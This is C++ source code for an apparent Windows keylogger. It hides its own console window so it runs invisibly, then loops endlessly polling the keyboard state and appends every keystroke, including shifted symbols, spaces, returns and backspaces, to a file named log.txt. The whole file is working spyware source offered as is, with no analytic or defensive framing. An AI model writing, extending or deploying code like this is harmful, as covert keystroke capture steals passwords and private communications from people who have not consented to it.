#include <iostream>
#include <fstream>
#include <stdio.h>
#include <windows.h>
#include <Winuser.h>
//#include <SFML/Window.hpp>

#include "keylogger.h"


using namespace std;


int main() {
    Hide();
    Log();
    return 0;
}

void Hide(){
        HWND stealth;
        AllocConsole();
        stealth=FindWindowA("ConsoleWindowClass",NULL);
        ShowWindow(stealth,0);
}

void Log(){
    char key;
    //Range of ASCII: 32-127 or 175 (extended)
        //UPPERCASE = 65-90
        //+32
        //lowercase = 97-122
        
    for(;;) {
        for(key=32; key<=127; key++) {

            // Windows    
            if(GetAsyncKeyState(key) == -32767) {
                ofstream write ("log.txt", ios::app);

                if(GetAsyncKeyState(0x10)) {
                    if ((key>64) && (key<91)) {
                        write << key;
                        break;
                    }
                    else {
                        switch(key) {
                            case 48:{write << ")";}break;
                            case 49:{write << "!";}break;
                            case 50:{write << "@";}break;
                            case 51:{write << "#";}break;
                            case 52:{write << "$";}break;
                            case 53:{write << "%";}break;
                            case 54:{write << "¨";}break;
                            case 55:{write << "&";}break;
                            case 56:{write << "*";}break;
                            case 57:{write << "(";}break;
                        }
                    }
                }
                else {
                    if ((key>64) && (key<91)) {
                        key+=32;
                        write << key;
                        break;
                    }
                    else {
                        switch(key) {
                            case VK_SPACE:{write << " ";}break;
                            case VK_RETURN:{write << "\n";}break;
                            case VK_TAB:{write << "\t";}break;
                            case VK_ESCAPE:{write << "<Esc>";}break;
                            case VK_BACK:{write << "<BackSpace>";}break;
                            case VK_DELETE:{write << "<Delete";}break;
                        }
                    }
                }
                write.close();
            }  
        }
    }
    
}


